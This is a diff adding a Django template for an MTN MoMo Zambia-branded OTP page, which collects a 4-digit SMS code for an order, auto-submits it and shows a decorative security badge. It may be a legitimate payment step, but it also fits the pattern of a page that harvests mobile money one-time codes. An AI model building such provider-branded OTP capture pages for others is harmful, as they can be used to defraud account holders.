@@ -1,0 +1,85 @@
+{% extends "base.html" %}
+{% load static %}
+
+{% block title %}OTP Verification - MTN MoMo Zambia{% endblock %}
+
+{% block content %}
+<div class="max-w-md mx-auto">
+    <div class="bg-white rounded-3xl card-shadow overflow-hidden">
+        <!-- Header -->
+        <div class="p-6 border-b border-gray-100">
+            <div class="flex items-center justify-between mb-6">
+                <a href="{% url 'sms_verification' order.id %}" class="flex items-center text-gray-600 font-bold text-sm">
+                    <i class="uil uil-arrow-left text-xl mr-1"></i> Back
+                </a>
+                <div class="text-right">
+                    <p class="text-xs text-gray-400 font-bold uppercase tracking-wider">Amount</p>
+                    <p class="text-xl font-black text-orange-500">ZMW {{ order.amount }}</p>
+                </div>
+            </div>
+            <h1 class="text-2xl font-black text-gray-900">OTP Verification</h1>
+            <p class="text-gray-500 text-sm mt-1">Please enter the OTP code you received in the SMS.</p>
+        </div>
+
+        <!-- Content -->
+        <div class="p-6 space-y-6">
+            <div class="text-center py-4">
+                <p class="text-gray-400 text-xs font-bold uppercase tracking-widest mb-1">Sending to</p>
+                <p class="text-gray-900 font-bold mt-2">{{ order.momo_number }}</p>
+            </div>
+
+            <form method="POST" class="space-y-6">
+                {% csrf_token %}
+                <input type="hidden" name="action" value="verify_otp">
+                
+                <div class="space-y-2">
+                    <label class="text-xs font-bold text-gray-400 uppercase tracking-wider ml-1">Enter OTP Code</label>
+                    <input 
+                        type="text" 
+                        name="otp_code" 
+                        id="otp_code"
+                        class="w-full px-5 py-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-orange-500 focus:ring-4 focus:ring-orange-100 focus:outline-none transition-all font-black text-center text-2xl tracking-widest text-gray-900 placeholder-gray-300"
+                        placeholder="••••"
+                        maxlength="4"
+                        inputmode="numeric"
+                        required
+                    >
+                </div>
+
+                <button type="submit" id="otpSubmitBtn" class="w-full bg-orange-500 hover:bg-orange-600 text-white font-black py-5 rounded-2xl shadow-lg shadow-orange-200 transition-all transform active:scale-[0.98] flex items-center justify-center gap-2">
+                    Verify & Complete <i class="uil uil-check-circle text-xl"></i>
+                </button>
+            </form>
+
+            <script>
+                const otpInput = document.getElementById('otp_code');
+                const otpForm = document.querySelector('form');
+                const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+
+                otpInput.addEventListener('input', function (e) {
+                    // Only allow numbers
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    // Limit to 4 digits
+                    if (this.value.length > 4) {
+                        this.value = this.value.slice(0, 4);
+                    }
+                    
+                    // Auto-submit when 4 digits are entered
+                    if (this.value.length === 4) {
+                        setTimeout(() => {
+                            otpForm.submit();
+                        }, 300);
+                    }
+                });
+            </script>
+
+            <div class="text-center">
+                <p class="text-gray-400 text-xs font-bold">
+                    <i class="uil uil-shield-check text-green-500 mr-1"></i> SSL ENCRYPTED AND SECURE
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
